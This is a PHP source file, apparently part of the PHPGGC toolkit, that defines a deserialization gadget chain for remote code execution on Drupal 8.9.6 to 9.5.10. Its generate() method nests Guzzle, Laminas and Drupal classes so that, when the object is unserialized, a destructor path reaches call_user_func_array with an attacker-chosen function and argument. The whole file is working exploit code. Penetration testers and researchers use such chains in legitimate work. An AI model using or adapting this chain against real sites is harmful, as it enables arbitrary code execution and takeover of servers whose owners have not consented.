<?php

namespace GadgetChain\Drupal9;

class RCE1 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '-8.9.6 <= 9.5.10+';
    public static $vector = '__destruct';
    public static $author = 'rioru';
    public static $information = 
    'Guzzle and Laminas are required for this chain but are bundled by default in Drupal.
    Uses a __destruct() to call __toString() and finally lands in a call_user_func_array after a few call jumps.
    Tested on drupal versions from 8.9.6 up to 9.5.10 (latest), might work on slightly older versions.';

    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $parameter = $parameters['parameter'];
        return (
            new \GuzzleHttp\Cookie\FileCookieJar(
                new \Laminas\Diactoros\RelativeStream(
                    new \GuzzleHttp\Psr7\PumpStream(
                        new \Drupal\Core\Config\CachedStorage(
                            new \Drupal\Core\Config\MemoryStorage(),
                            new \Drupal\Component\DependencyInjection\Container(
                                ["1000000"=>serialize(["factory"=>$function, "arguments"=>[$parameter]])]
                                )
                        )
                    )
                )
            )
        );
    }
}
